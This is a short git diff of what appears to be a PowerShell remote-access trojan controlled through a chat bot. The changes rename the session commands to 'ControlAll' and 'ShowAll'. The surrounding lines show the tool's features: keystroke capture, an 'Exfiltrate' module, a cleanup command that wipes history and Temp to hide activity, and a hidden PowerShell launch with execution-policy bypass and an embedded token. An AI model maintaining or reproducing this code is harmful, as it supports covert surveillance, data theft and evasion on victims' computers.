@@ -107,7 +107,8 @@ Function Options {
 - **ExtraInfo**: Get a list of further info and command examples
 - **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
 - **Kill**: Stop a running module (eg. Keycapture / Exfiltrate)
-- **Control-All**: Control all waiting sessions simultaneously
+- **ControlAll**: Control all waiting sessions simultaneously
+- **ShowAll**: Show all waiting sessions in chat.
 - **Pause**: Pause the current authenticated session
 - **Close**: Close this session
 "@
@@ -1238,7 +1239,7 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch=
 }
 
 Function Authenticate{
-    if (($response -like "$env:COMPUTERNAME") -or ($response -like "Control-All")) {
+    if (($response -like "$env:COMPUTERNAME") -or ($response -like "ControlAll")) {
         Write-Host "Authenticated $env:COMPUTERNAME"
         $script:authenticated = 1
         $script:previouscmd = $response
@@ -1266,7 +1267,7 @@ while($true){
 
         Write-Output "Command found!"
         if($authenticated -ne 1){
-            if ($response -like "Show-Pending") {
+            if ($response -like "ShowAll") {
 		WaitingMsg
      	    }
      	}
